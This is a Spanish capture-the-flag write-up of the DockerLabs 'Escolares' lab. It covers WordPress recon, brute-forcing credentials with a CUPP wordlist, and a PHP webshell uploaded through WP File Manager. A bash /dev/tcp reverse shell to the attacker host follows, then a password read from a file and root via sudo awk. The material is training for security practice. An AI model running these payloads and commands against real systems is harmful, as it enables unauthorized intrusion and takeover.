---
title: "DockerLabs - Escolares"
difficulty: "Fácil"
source: "DockerLabs"
---

Explotación de WordPress via credenciales obtenidas con CUPP y subida de webshell mediante el plugin WP File Manager. Escalada a root con movimiento lateral por credencial en archivo expuesto y sudo awk.

## Despliegue

```bash
docker load -i escolares.tar
docker run -d --rm --name escolares escolares:latest
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH
- **80/tcp** — HTTP (Apache)

## Enumeración web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

Encontrado:
- `/wordpress/` — instalación de WordPress
- `/phpmyadmin/` — panel de base de datos
- `/info.php` — phpinfo()

WordPress usa el dominio `escolares.dl`. Añadir a `/etc/hosts`:

```bash
echo "172.17.0.2 escolares.dl" | sudo tee -a /etc/hosts
```

## Enumeración WordPress

```bash
wpscan --url http://escolares.dl/wordpress --enumerate u,p --plugins-detection aggressive
```

Usuario encontrado: **luisillo**

Plugin instalado: **WP File Manager**

Revisando los posts/comentarios del sitio se obtiene que **luis** es el profesor administrador.

## Acceso — Credenciales con CUPP

```bash
git clone https://github.com/Mebus/cupp
cd cupp
python3 cupp.py -i
# Nombre: luis
```

CUPP genera una wordlist con variaciones. Atacar con wpscan:

```bash
wpscan --url http://escolares.dl/wordpress -U luisillo -P luis.txt
```

Credenciales encontradas: **luisillo : Luis1981**

## Intrusión — Webshell via WP File Manager

Acceder al panel admin:

```
http://escolares.dl/wordpress/wp-admin
usuario: luisillo
password: Luis1981
```

Desde **WP File Manager** en el menú lateral, navegar a `/wp-content/uploads/` y subir la webshell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Verificar RCE:

```
http://escolares.dl/wordpress/wp-content/uploads/shell.php?cmd=id
# uid=33(www-data)
```

Reverse shell (listener en 4444):

```
http://escolares.dl/wordpress/wp-content/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.17.0.1/4444+0>%261'
```

## Tratamiento de TTY

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Acceso como **www-data**.

## Lateral movement — www-data → luisillo

Desde www-data, listar `/home`:

```bash
ls /home/luisillo/
cat /home/luisillo/secret.txt
# luisillopasswordsecret
```

Cambiar a luisillo:

```bash
su luisillo
# password: luisillopasswordsecret
```

## Escalada — luisillo → root

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/awk
```

GTFOBins con awk:

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
whoami
# root
```

## Conclusión

Cadena de ataque completa:

1. **Reconocimiento** — nmap detecta puertos 22 y 80
2. **Enumeración** — gobuster encuentra /wordpress/, wpscan enumera usuario luisillo y plugin WP File Manager
3. **CUPP** — wordlist personalizada con nombre "luis" → credenciales luisillo:Luis1981
4. **WP File Manager** — subida de webshell PHP desde el panel admin autenticado
5. **RCE** — shell.php en /uploads/ → reverse shell como www-data
6. **Lateral movement** — /home/luisillo/secret.txt expuesto → credencial luisillopasswordsecret → su luisillo
7. **Escalada** — sudo awk sin contraseña → GTFOBins → root

**Lecciones aprendidas:**
- CUPP genera wordlists personalizadas efectivas cuando se conoce el nombre de la víctima.
- WP File Manager permite subir PHP arbitrario desde el panel admin — equivale a RCE directo.
- Archivos con credenciales en /home accesibles por www-data son lateral movement trivial.
- `awk` con sudo sin restricciones es escalada directa via GTFOBins.
